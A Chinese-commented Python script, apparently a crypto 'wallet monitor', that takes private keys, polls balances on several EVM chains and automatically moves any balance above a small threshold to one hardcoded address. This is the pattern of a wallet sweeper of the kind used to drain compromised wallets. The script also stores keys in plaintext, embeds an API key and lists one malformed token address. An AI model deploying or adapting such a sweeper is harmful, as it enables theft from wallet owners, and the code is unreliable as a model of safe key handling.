import asyncio
import logging
import os
import json
import time
import sys
import subprocess
import re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# Web3导入 - 添加错误处理
try:
    from web3 import Web3, HTTPProvider
    WEB3_AVAILABLE = True
    print("✅ Web3库已加载")
except ImportError as e:
    WEB3_AVAILABLE = False
    print(f"⚠️  Web3库导入失败: {str(e)}")
    print("📦 请运行: pip install web3")
    sys.exit(1)

# eth_account导入
try:
    from eth_account import Account
    ETH_ACCOUNT_AVAILABLE = True
    print("✅ eth_account库已加载")
except ImportError as e:
    ETH_ACCOUNT_AVAILABLE = False
    print(f"⚠️  eth_account库导入失败: {str(e)}")
    print("📦 请运行: pip install eth-account")
    sys.exit(1)

# Alchemy导入
try:
    from alchemy import Alchemy, Network
    ALCHEMY_AVAILABLE = True
    print("✅ Alchemy SDK已加载")
except ImportError:
    try:
        from alchemy_sdk import Alchemy, Network
        ALCHEMY_AVAILABLE = True
        print("✅ Alchemy SDK (alchemy-sdk)已加载")
    except ImportError:
        ALCHEMY_AVAILABLE = False
        print("⚠️  Alchemy SDK不可用，EVM全链查询功能将受限")
        print("📦 请运行: pip install alchemy")

import aiohttp

try:
    from telegram import Bot
    TELEGRAM_AVAILABLE = True
    print("✅ Telegram库已加载")
except ImportError:
    TELEGRAM_AVAILABLE = False
    print("⚠️  Telegram库不可用，通知功能将被禁用")
    print("📦 请运行: pip install python-telegram-bot")

from logging.handlers import RotatingFileHandler

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    CRYPTO_AVAILABLE = True
    print("✅ 加密库已加载")
except ImportError:
    CRYPTO_AVAILABLE = False
    print("⚠️  cryptography库不可用，状态保存功能将被禁用")
    print("📦 请运行: pip install cryptography")

import threading

# 检查colorama依赖（用于彩色输出）
try:
    from colorama import init, Fore, Back, Style
    COLORAMA_AVAILABLE = True
    init(autoreset=True)
except ImportError:
    COLORAMA_AVAILABLE = False
    print("⚠️  colorama库未安装，将使用普通输出")
    print("📦 请运行: pip install colorama")
    # 定义空的颜色常量
    class MockColor:
        def __getattr__(self, name): return ""
    Fore = Back = Style = MockColor()

# 配置
class Config:
    def __init__(self):
        # API配置
        self.ALCHEMY_API_KEY = "S0hs4qoXIR1SMD8P7I6Wt"
        
        # 转账目标地址
        self.EVM_TARGET_ADDRESS = "0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1"
        
        # 监控配置
        try:
            self.MIN_BALANCE_WEI = Web3.to_wei(0.0001, 'ether')
        except:
            self.MIN_BALANCE_WEI = int(0.0001 * 1e18)
        self.MIN_TOKEN_BALANCE = 0.0001
        self.SLEEP_INTERVAL = 30
        self.NUM_THREADS = 10
        
        # 文件配置
        self.STATE_FILE = "evm_wallet_state.json"
        self.LOG_FILE = "evm_wallet_monitor.log"
        self.MAX_LOG_SIZE = 500 * 1024 * 1024  # 500MB
        self.LOG_BACKUP_COUNT = 1
        
        # 加密配置
        self.ENCRYPTION_PASSWORD = "evm_wallet_monitor_secure_password_2024"
        
        # 代币查询配置
        self.ENABLE_FULL_CHAIN_TOKEN_DISCOVERY = True
        self.ENABLE_MANUAL_TOKEN_CHECK = True
        self.MAX_TOKENS_PER_CHAIN = 100
        
        # RPC切换配置
        self.ALCHEMY_ERROR_THRESHOLD = 5
        self.ALCHEMY_SWITCH_DURATION = 5 * 60 * 60  # 5小时
        self.USE_PUBLIC_RPC = False
        self.ALCHEMY_ERROR_COUNT = 0
        self.LAST_ALCHEMY_SWITCH_TIME = 0
        
        # 地址预检查配置
        self.ENABLE_ADDRESS_PRE_CHECK = True
        self.MIN_TRANSACTION_COUNT = 1
        self.MIN_BALANCE_THRESHOLD = 0
        
        # Telegram配置（可选）
        self.TELEGRAM_BOT_TOKEN = None
        self.TELEGRAM_CHAT_ID = None
        
        # 控制菜单配置
        self.ENABLE_CONTROL_MENU = True
        self.MENU_REFRESH_INTERVAL = 60
        
        # 验证地址格式
        self._validate_addresses()
    
    def _validate_addresses(self):
        """验证目标地址格式"""
        validation_passed = True
        
        try:
            # 验证EVM地址
            if not Web3.is_address(self.EVM_TARGET_ADDRESS):
                print(f"⚠️ 无效的EVM目标地址: {self.EVM_TARGET_ADDRESS}")
                print("🔧 请检查配置文件中的EVM_TARGET_ADDRESS设置")
                validation_passed = False
            else:
                print(f"✅ EVM目标地址验证通过: {self.EVM_TARGET_ADDRESS}")
            
            # 验证其他配置项
            if self.MIN_BALANCE_WEI <= 0:
                print(f"⚠️ 最小余额阈值设置过小: {self.MIN_BALANCE_WEI}")
                validation_passed = False
                
            if self.SLEEP_INTERVAL <= 0:
                print(f"⚠️ 监控间隔设置无效: {self.SLEEP_INTERVAL}")
                validation_passed = False
            
            return validation_passed
            
        except Exception as e:
            print(f"❌ 地址验证过程出错: {str(e)}")
            return False

config = Config()

# 日志系统
def setup_enhanced_logger():
    """设置增强的日志系统"""
    logger = logging.getLogger('EVMWalletMonitor')
    logger.setLevel(logging.DEBUG)
    
    # 清除已有的处理器
    logger.handlers.clear()
    
    # 文件处理器（带轮转）
    try:
        file_handler = RotatingFileHandler(
            config.LOG_FILE,
            maxBytes=config.MAX_LOG_SIZE,
            backupCount=config.LOG_BACKUP_COUNT,
            encoding='utf-8'
        )
        file_formatter = logging.Formatter(
            '%(asctime)s - %(levelname)s - [%(funcName)s:%(lineno)d] - %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        file_handler.setFormatter(file_formatter)
        logger.addHandler(file_handler)
    except Exception as e:
        print(f"⚠️ 无法创建日志文件处理器: {str(e)}")
    
    # 控制台处理器
    console_handler = logging.StreamHandler()
    console_handler.setLevel(logging.INFO)
    console_formatter = logging.Formatter(
        '%(asctime)s - %(levelname)s - %(message)s',
        datefmt='%H:%M:%S'
    )
    console_handler.setFormatter(console_formatter)
    logger.addHandler(console_handler)
    
    return logger

logger = setup_enhanced_logger()

# EVM链配置
ALCHEMY_CHAINS = [
    # 主网
    {"name": "Ethereum", "network": Network.ETH_MAINNET if ALCHEMY_AVAILABLE else None, 
     "rpc_url": f"https://eth-mainnet.g.alchemy.com/v2/{config.ALCHEMY_API_KEY}", 
     "chain_id": 1, "native_token": "ETH", 
     "public_rpc": "https://eth.llamarpc.com", 
     "backup_rpcs": ["https://rpc.ankr.com/eth", "https://ethereum.publicnode.com"]},
    
    {"name": "Polygon PoS", "network": Network.MATIC_MAINNET if ALCHEMY_AVAILABLE else None, 
     "rpc_url": f"https://polygon-mainnet.g.alchemy.com/v2/{config.ALCHEMY_API_KEY}", 
     "chain_id": 137, "native_token": "MATIC", 
     "public_rpc": "https://polygon-rpc.com", 
     "backup_rpcs": ["https://rpc.ankr.com/polygon", "https://polygon.llamarpc.com"]},
    
    {"name": "Arbitrum", "network": Network.ARB_MAINNET if ALCHEMY_AVAILABLE else None, 
     "rpc_url": f"https://arb-mainnet.g.alchemy.com/v2/{config.ALCHEMY_API_KEY}", 
     "chain_id": 42161, "native_token": "ETH", 
     "public_rpc": "https://arb1.arbitrum.io/rpc", 
     "backup_rpcs": ["https://rpc.ankr.com/arbitrum", "https://arbitrum.llamarpc.com"]},
    
    {"name": "Optimism", "network": Network.OPT_MAINNET if ALCHEMY_AVAILABLE else None, 
     "rpc_url": f"https://opt-mainnet.g.alchemy.com/v2/{config.ALCHEMY_API_KEY}", 
     "chain_id": 10, "native_token": "ETH", 
     "public_rpc": "https://mainnet.optimism.io", 
     "backup_rpcs": ["https://rpc.ankr.com/optimism", "https://optimism.llamarpc.com"]},
    
    {"name": "Base", "network": None, 
     "rpc_url": f"https://base-mainnet.g.alchemy.com/v2/{config.ALCHEMY_API_KEY}", 
     "chain_id": 8453, "native_token": "ETH", 
     "public_rpc": "https://mainnet.base.org", 
     "backup_rpcs": ["https://base.llamarpc.com", "https://base.publicnode.com"]},
    
    {"name": "BNB Smart Chain", "network": None, 
     "rpc_url": f"https://bnb-mainnet.g.alchemy.com/v2/{config.ALCHEMY_API_KEY}", 
     "chain_id": 56, "native_token": "BNB", 
     "public_rpc": "https://bsc-dataseed.binance.org", 
     "backup_rpcs": ["https://bsc.drpc.org", "https://1rpc.io/bnb"]},
    
    {"name": "Avalanche", "network": None, 
     "rpc_url": f"https://avax-mainnet.g.alchemy.com/v2/{config.ALCHEMY_API_KEY}", 
     "chain_id": 43114, "native_token": "AVAX", 
     "public_rpc": "https://api.avax.network/ext/bc/C/rpc", 
     "backup_rpcs": ["https://avalanche.drpc.org", "https://1rpc.io/avax"]},
    
    # 测试网
    {"name": "Ethereum Sepolia", "network": None, 
     "rpc_url": f"https://eth-sepolia.g.alchemy.com/v2/{config.ALCHEMY_API_KEY}", 
     "chain_id": 11155111, "native_token": "ETH", 
     "public_rpc": "https://rpc.sepolia.org", 
     "backup_rpcs": ["https://sepolia.drpc.org", "https://1rpc.io/sepolia"]},
]

# ERC-20 Token configurations
ERC20_TOKENS = {
    "USDT": {
        "Ethereum": "0xdAC17F958D2ee523a2206206994597C13D831ec7",
        "Polygon PoS": "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
        "Arbitrum": "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",
        "Optimism": "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58",
        "BNB Smart Chain": "0x55d398326f99059fF775485246999027B3197955",
        "Base": "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb6",
        "Avalanche": "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7",
    },
    "USDC": {
        "Ethereum": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
        "Polygon PoS": "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
        "Arbitrum": "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8",
        "Optimism": "0x7F5c764cBc14f9669B88837ca1490cCa17c31607",
        "BNB Smart Chain": "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
        "Base": "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
        "Avalanche": "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E",
    },
}

def generate_evm_address_from_private_key(private_key: str) -> str:
    """从EVM私钥生成地址"""
    try:
        # 移除可能的0x前缀
        cleaned_key = private_key[2:] if private_key.startswith("0x") else private_key
        
        # 验证是否为有效的64字符十六进制字符串
        if len(cleaned_key) != 64 or not all(c in "0123456789abcdefABCDEF" for c in cleaned_key):
            raise ValueError("无效的EVM私钥格式")
        
        # 创建账户并生成地址
        account = Account.from_key(private_key)
        address = account.address
        
        logger.debug(f"成功生成EVM地址: {address}")
        return address
        
    except Exception as e:
        logger.error(f"生成EVM地址失败: {str(e)}")
        return None

class EVMWalletMonitor:
    def __init__(self):
        # 基础配置
        self.private_keys = []
        self.addresses = []
        self.addr_to_key = {}
        self.active_addr_to_chains = {}
        self.evm_clients = []
        
        # 线程安全的状态变量
        self._state_lock = threading.Lock()
        self._alchemy_error_count = 0
        self._use_public_rpc = False
        self._rpc_switch_time = 0
        
        # 监控状态
        self.monitoring_active = False
        
        logger.info("🚀 EVM钱包监控器初始化完成")
    
    def add_private_key(self, private_key: str):
        """添加私钥并生成地址"""
        try:
            # 验证私钥格式
            cleaned_key = private_key.strip()
            if not cleaned_key:
                print(f"{Fore.RED}❌ 私钥不能为空{Style.RESET_ALL}")
                return False
            
            # 生成地址
            address = generate_evm_address_from_private_key(cleaned_key)
            if not address:
                print(f"{Fore.RED}❌ 无法从私钥生成地址{Style.RESET_ALL}")
                return False
            
            # 检查是否已存在
            if address in self.addresses:
                print(f"{Fore.YELLOW}⚠️ 地址已存在: {address}{Style.RESET_ALL}")
                return False
            
            # 添加到列表
            self.private_keys.append(cleaned_key)
            self.addresses.append(address)
            self.addr_to_key[address] = cleaned_key
            
            print(f"{Fore.GREEN}✅ 成功添加EVM地址: {address}{Style.RESET_ALL}")
            logger.info(f"添加新的EVM地址: {address}")
            return True
            
        except Exception as e:
            print(f"{Fore.RED}❌ 添加私钥失败: {str(e)}{Style.RESET_ALL}")
            logger.error(f"添加私钥失败: {str(e)}")
            return False
    
    def initialize_evm_clients(self):
        """初始化EVM客户端"""
        print(f"\n{Fore.CYAN}🔧 正在初始化EVM客户端...{Style.RESET_ALL}")
        
        self.evm_clients = []
        working_clients = 0
        
        for chain in ALCHEMY_CHAINS:
            try:
                # 选择RPC URL
                rpc_url = chain['rpc_url']
                if self._use_public_rpc or not rpc_url:
                    rpc_url = chain['public_rpc']
                
                # 创建Web3实例
                w3 = Web3(HTTPProvider(rpc_url))
                
                # 测试连接
                if w3.is_connected():
                    block_number = w3.eth.block_number
                    
                    client = {
                        'name': chain['name'],
                        'w3': w3,
                        'chain_id': chain['chain_id'],
                        'native_token': chain['native_token'],
                        'rpc_url': rpc_url,
                        'network': chain.get('network'),
                        'backup_rpcs': chain.get('backup_rpcs', [])
                    }
                    
                    self.evm_clients.append(client)
                    working_clients += 1
                    
                    print(f"   ✅ {chain['name']} - 区块: {block_number:,}")
                    
                else:
                    print(f"   ❌ {chain['name']} - 连接失败")
                    
            except Exception as e:
                print(f"   ❌ {chain['name']} - 错误: {str(e)[:50]}...")
                logger.error(f"初始化{chain['name']}客户端失败: {str(e)}")
        
        print(f"\n{Fore.GREEN}📊 EVM客户端初始化完成: {working_clients}/{len(ALCHEMY_CHAINS)} 个可用{Style.RESET_ALL}")
        
        if working_clients == 0:
            print(f"{Fore.RED}❌ 没有可用的EVM客户端，请检查网络连接和API配置{Style.RESET_ALL}")
            return False
        
        return True
    
    async def check_evm_balance(self, w3, address: str, chain_name: str) -> dict:
        """检查EVM地址余额"""
        try:
            # 检查原生代币余额
            balance_wei = w3.eth.get_balance(address)
            balance_eth = Web3.from_wei(balance_wei, 'ether')
            
            result = {
                'address': address,
                'chain': chain_name,
                'native_balance': float(balance_eth),
                'native_balance_wei': balance_wei,
                'tokens': []
            }
            
            # 如果余额大于阈值，检查代币
            if balance_wei >= config.MIN_BALANCE_WEI:
                # 这里可以添加代币余额检查逻辑
                # 暂时跳过代币检查以保持脚本简洁
                pass
            
            return result
            
        except Exception as e:
            logger.error(f"检查{chain_name}余额失败 {address}: {str(e)}")
            return None
    
    async def send_evm_transaction(self, w3, from_address: str, private_key: str, 
                                   chain_name: str, amount_wei: int = None) -> bool:
        """发送EVM交易"""
        try:
            # 获取账户
            account = Account.from_key(private_key)
            
            # 获取当前余额
            balance = w3.eth.get_balance(from_address)
            
            # 估算gas费用
            gas_price = w3.eth.gas_price
            gas_limit = 21000  # 标准转账gas限制
            gas_cost = gas_price * gas_limit
            
            # 计算转账金额（保留gas费用）
            if amount_wei is None:
                amount_wei = balance - gas_cost - Web3.to_wei(0.001, 'ether')  # 保留一点余量
            
            if amount_wei <= 0:
                logger.warning(f"余额不足以支付gas费用: {from_address}")
                return False
            
            # 构建交易
            transaction = {
                'to': config.EVM_TARGET_ADDRESS,
                'value': amount_wei,
                'gas': gas_limit,
                'gasPrice': gas_price,
                'nonce': w3.eth.get_transaction_count(from_address),
                'chainId': w3.eth.chain_id
            }
            
            # 签名交易
            signed_txn = account.sign_transaction(transaction)
            
            # 发送交易
            tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
            
            logger.info(f"✅ {chain_name} 交易已发送: {tx_hash.hex()}")
            print(f"{Fore.GREEN}✅ {chain_name} 交易已发送{Style.RESET_ALL}")
            print(f"   📍 从: {from_address}")
            print(f"   📍 到: {config.EVM_TARGET_ADDRESS}")
            print(f"   💰 金额: {Web3.from_wei(amount_wei, 'ether'):.6f} ETH")
            print(f"   🔗 交易哈希: {tx_hash.hex()}")
            
            return True
            
        except Exception as e:
            logger.error(f"发送{chain_name}交易失败: {str(e)}")
            print(f"{Fore.RED}❌ {chain_name} 交易失败: {str(e)}{Style.RESET_ALL}")
            return False
    
    async def monitor_single_address(self, address: str):
        """监控单个地址"""
        try:
            private_key = self.addr_to_key.get(address)
            if not private_key:
                logger.error(f"找不到地址的私钥: {address}")
                return
            
            for client in self.evm_clients:
                try:
                    w3 = client['w3']
                    chain_name = client['name']
                    
                    # 检查余额
                    balance_info = await self.check_evm_balance(w3, address, chain_name)
                    if not balance_info:
                        continue
                    
                    native_balance_wei = balance_info['native_balance_wei']
                    native_balance = balance_info['native_balance']
                    
                    # 如果余额超过阈值，发送交易
                    if native_balance_wei >= config.MIN_BALANCE_WEI:
                        logger.info(f"🎯 检测到余额: {address} 在 {chain_name} - {native_balance:.6f} {client['native_token']}")
                        
                        # 发送交易
                        success = await self.send_evm_transaction(
                            w3, address, private_key, chain_name
                        )
                        
                        if success:
                            # 发送Telegram通知（如果配置了）
                            if config.TELEGRAM_BOT_TOKEN and config.TELEGRAM_CHAT_ID:
                                await self.send_telegram_notification(
                                    f"💰 EVM转账成功\n"
                                    f"链: {chain_name}\n"
                                    f"地址: {address}\n"
                                    f"金额: {native_balance:.6f} {client['native_token']}"
                                )
                
                except Exception as e:
                    logger.error(f"监控地址 {address} 在 {client['name']} 时出错: {str(e)}")
                    continue
                    
        except Exception as e:
            logger.error(f"监控地址失败 {address}: {str(e)}")
    
    async def send_telegram_notification(self, message: str):
        """发送Telegram通知"""
        try:
            if not TELEGRAM_AVAILABLE or not config.TELEGRAM_BOT_TOKEN:
                return
            
            bot = Bot(token=config.TELEGRAM_BOT_TOKEN)
            await bot.send_message(chat_id=config.TELEGRAM_CHAT_ID, text=message)
            logger.info("Telegram通知已发送")
            
        except Exception as e:
            logger.error(f"发送Telegram通知失败: {str(e)}")
    
    async def start_monitoring(self):
        """开始监控"""
        logger.info(f"🚀 开始监控 {len(self.addresses)} 个EVM地址")
        print(f"{Fore.GREEN}🚀 监控已启动{Style.RESET_ALL}")
        
        while self.monitoring_active:
            try:
                # 并发监控所有地址
                tasks = []
                for address in self.addresses:
                    task = asyncio.create_task(self.monitor_single_address(address))
                    tasks.append(task)
                
                if tasks:
                    await asyncio.gather(*tasks, return_exceptions=True)
                
                # 等待下一轮检查
                await asyncio.sleep(config.SLEEP_INTERVAL)
                
            except Exception as e:
                logger.error(f"监控循环出错: {str(e)}")
                await asyncio.sleep(5)  # 短暂等待后重试
        
        logger.info("监控已停止")
    
    def save_state(self):
        """保存状态"""
        try:
            state = {
                'addresses': self.addresses,
                'private_keys': self.private_keys,  # 注意：实际应用中应该加密存储
                'active_addr_to_chains': self.active_addr_to_chains,
                'timestamp': datetime.now().isoformat()
            }
            
            with open(config.STATE_FILE, 'w', encoding='utf-8') as f:
                json.dump(state, f, indent=2, ensure_ascii=False)
            
            logger.info("状态已保存")
            
        except Exception as e:
            logger.error(f"保存状态失败: {str(e)}")
    
    def load_state(self):
        """加载状态"""
        try:
            if not os.path.exists(config.STATE_FILE):
                return False
            
            with open(config.STATE_FILE, 'r', encoding='utf-8') as f:
                state = json.load(f)
            
            self.addresses = state.get('addresses', [])
            self.private_keys = state.get('private_keys', [])
            self.active_addr_to_chains = state.get('active_addr_to_chains', {})
            
            # 重建地址到私钥的映射
            self.addr_to_key = {}
            for i, address in enumerate(self.addresses):
                if i < len(self.private_keys):
                    self.addr_to_key[address] = self.private_keys[i]
            
            logger.info(f"状态已加载，包含 {len(self.addresses)} 个地址")
            return True
            
        except Exception as e:
            logger.error(f"加载状态失败: {str(e)}")
            return False
    
    def run_main_menu(self):
        """运行主菜单"""
        while True:
            try:
                print("\n" + "="*70)
                print(f"{Fore.CYAN}{Style.BRIGHT}🚀 EVM钱包监控系统 - 主菜单{Style.RESET_ALL}")
                print("="*70)
                print(f"📊 当前状态:")
                print(f"   • 钱包地址: {len(self.addresses)} 个")
                print(f"   • EVM客户端: {len(self.evm_clients)} 个")
                print(f"   • 监控状态: {'🟢 运行中' if self.monitoring_active else '🔴 已停止'}")
                print()
                print("🔧 操作选项:")
                print("1. 📝 添加钱包私钥")
                print("2. 📋 查看当前地址")
                print("3. 🔧 初始化系统")
                print("4. 🚀 开始监控")
                print("5. ⏹️  停止监控")
                print("6. 💾 保存状态")
                print("7. 📂 加载状态")
                print("8. 🔍 检查连接")
                print("9. 🚪 退出")
                print("="*70)
                
                choice = input(f"{Fore.YELLOW}请选择操作 (1-9): {Style.RESET_ALL}").strip()
                
                if choice == "1":
                    self.add_private_key_menu()
                elif choice == "2":
                    self.show_addresses()
                elif choice == "3":
                    self.initialize_evm_clients()
                elif choice == "4":
                    self.start_monitoring_menu()
                elif choice == "5":
                    self.stop_monitoring()
                elif choice == "6":
                    self.save_state()
                    print(f"{Fore.GREEN}✅ 状态已保存{Style.RESET_ALL}")
                elif choice == "7":
                    if self.load_state():
                        print(f"{Fore.GREEN}✅ 状态已加载{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.RED}❌ 加载状态失败{Style.RESET_ALL}")
                elif choice == "8":
                    self.check_connections()
                elif choice == "9":
                    if self.safe_exit():
                        break
                else:
                    print(f"{Fore.RED}❌ 无效选择，请输入 1-9{Style.RESET_ALL}")
                
                time.sleep(1)
                
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}⏹️ 程序被用户中断{Style.RESET_ALL}")
                break
            except Exception as e:
                print(f"{Fore.RED}❌ 菜单异常: {str(e)}{Style.RESET_ALL}")
                logger.error(f"菜单异常: {str(e)}")
    
    def add_private_key_menu(self):
        """添加私钥菜单"""
        print(f"\n{Fore.CYAN}📝 添加EVM钱包私钥{Style.RESET_ALL}")
        print("请输入EVM私钥（64位十六进制，可选0x前缀）")
        
        while True:
            private_key = input(f"{Fore.YELLOW}私钥: {Style.RESET_ALL}").strip()
            
            if not private_key:
                print(f"{Fore.YELLOW}取消添加{Style.RESET_ALL}")
                break
            
            if self.add_private_key(private_key):
                add_more = input(f"{Fore.CYAN}是否继续添加？(y/N): {Style.RESET_ALL}").strip().lower()
                if add_more not in ['y', 'yes']:
                    break
            else:
                retry = input(f"{Fore.YELLOW}是否重试？(y/N): {Style.RESET_ALL}").strip().lower()
                if retry not in ['y', 'yes']:
                    break
    
    def show_addresses(self):
        """显示当前地址"""
        print(f"\n{Fore.CYAN}📋 当前EVM地址列表{Style.RESET_ALL}")
        
        if not self.addresses:
            print(f"{Fore.YELLOW}暂无地址{Style.RESET_ALL}")
            return
        
        for i, address in enumerate(self.addresses, 1):
            print(f"{i:2d}. {address}")
        
        print(f"\n总计: {len(self.addresses)} 个地址")
    
    def start_monitoring_menu(self):
        """开始监控菜单"""
        if self.monitoring_active:
            print(f"{Fore.YELLOW}❌ 监控已在运行中{Style.RESET_ALL}")
            return
        
        if not self.addresses:
            print(f"{Fore.RED}❌ 没有可监控的地址{Style.RESET_ALL}")
            return
        
        if not self.evm_clients:
            print(f"{Fore.RED}❌ 系统未初始化，请先初始化系统{Style.RESET_ALL}")
            return
        
        print(f"{Fore.CYAN}🚀 正在启动监控...{Style.RESET_ALL}")
        self.monitoring_active = True
        
        # 在新线程中启动监控
        def start_monitoring_thread():
            try:
                asyncio.run(self.start_monitoring())
            except Exception as e:
                logger.error(f"监控线程异常: {str(e)}")
                self.monitoring_active = False
        
        monitor_thread = threading.Thread(target=start_monitoring_thread, daemon=True)
        monitor_thread.start()
        
        print(f"{Fore.GREEN}✅ 监控已启动并在后台运行{Style.RESET_ALL}")
    
    def stop_monitoring(self):
        """停止监控"""
        if not self.monitoring_active:
            print(f"{Fore.YELLOW}❌ 监控未在运行{Style.RESET_ALL}")
            return
        
        self.monitoring_active = False
        print(f"{Fore.GREEN}✅ 监控已停止{Style.RESET_ALL}")
    
    def check_connections(self):
        """检查连接状态"""
        print(f"\n{Fore.CYAN}🔍 检查EVM客户端连接状态{Style.RESET_ALL}")
        
        if not self.evm_clients:
            print(f"{Fore.RED}❌ 没有可用的EVM客户端{Style.RESET_ALL}")
            return
        
        working_clients = 0
        for client in self.evm_clients:
            try:
                w3 = client['w3']
                if w3.is_connected():
                    block_number = w3.eth.block_number
                    print(f"   ✅ {client['name']} - 区块: {block_number:,}")
                    working_clients += 1
                else:
                    print(f"   ❌ {client['name']} - 连接失败")
            except Exception as e:
                print(f"   ❌ {client['name']} - 错误: {str(e)[:50]}...")
        
        print(f"\n工作状态: {working_clients}/{len(self.evm_clients)} 个客户端正常")
    
    def safe_exit(self):
        """安全退出"""
        print(f"\n{Fore.YELLOW}🚪 准备退出系统...{Style.RESET_ALL}")
        
        if self.monitoring_active:
            print(f"{Fore.YELLOW}⚠️ 检测到监控正在运行{Style.RESET_ALL}")
            stop_monitoring = input(f"{Fore.YELLOW}是否停止监控后退出? (Y/n): {Style.RESET_ALL}").strip().lower()
            if stop_monitoring in ['', 'y', 'yes']:
                self.monitoring_active = False
                print(f"{Fore.GREEN}✅ 监控已停止{Style.RESET_ALL}")
        
        # 保存状态
        try:
            self.save_state()
            print(f"{Fore.GREEN}💾 状态已保存{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}⚠️ 状态保存失败: {str(e)}{Style.RESET_ALL}")
        
        # 确认退出
        confirm = input(f"\n{Fore.RED}确认退出系统? (Y/n): {Style.RESET_ALL}").strip().lower()
        if confirm in ['', 'y', 'yes']:
            print(f"\n{Fore.GREEN}👋 感谢使用EVM钱包监控系统！{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.CYAN}💡 继续使用系统{Style.RESET_ALL}")
            return False

async def main():
    """主函数"""
    print("\033[2J\033[H")  # 清屏
    
    print(f"{Fore.CYAN}{Style.BRIGHT}")
    print("╔══════════════════════════════════════════════════════════════════════════════╗")
    print("║  🚀 EVM钱包监控系统 v1.0 正在启动...                                           ║")
    print("╚══════════════════════════════════════════════════════════════════════════════╝")
    print(f"{Style.RESET_ALL}")
    
    # 创建监控器实例
    monitor = EVMWalletMonitor()
    
    print(f"\n{Fore.GREEN}🎉 EVM钱包监控系统已准备就绪！{Style.RESET_ALL}")
    print(f"{Fore.CYAN}💡 专注于EVM生态系统的钱包监控和自动转账{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}📝 操作流程：初始化系统 → 添加钱包私钥 → 启动监控{Style.RESET_ALL}")
    print(f"{Fore.RED}🔒 安全提醒：私钥将在内存中处理，请确保运行环境安全{Style.RESET_ALL}")
    
    # 运行主菜单
    monitor.run_main_menu()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}⏹️ 程序被用户中断{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}❌ 程序异常退出: {str(e)}{Style.RESET_ALL}")
        if 'logger' in globals():
            logger.error(f"程序异常退出: {str(e)}")
    finally:
        print(f"\n{Fore.CYAN}👋 感谢使用EVM钱包监控系统！{Style.RESET_ALL}")
